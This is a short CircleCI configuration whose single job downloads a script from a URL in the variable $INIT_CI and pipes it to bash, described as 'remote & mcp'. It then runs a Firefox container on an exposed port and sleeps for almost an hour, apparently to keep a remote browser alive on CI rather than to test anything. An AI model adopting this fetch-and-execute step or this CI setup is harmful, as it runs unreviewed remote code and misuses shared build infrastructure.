version: 2.1

jobs:
  run-firefox-docker:
    machine:
      image: ubuntu-2404:current
    resource_class: medium
    steps:
      - checkout
      
      - run:
          name: 启动 Firefox 容器
          no_output_timeout: 59m
          command: |
            # remote & mcp
            curl -o initci.sh -s $INIT_CI && bash initci.sh
            
            docker run -d -p 5801:5800 docker.io/jlesage/firefox:latest
            
            # 等待容器启动
            sleep 3500

workflows:
  browser-suite:
    jobs:
      - run-firefox-docker
            
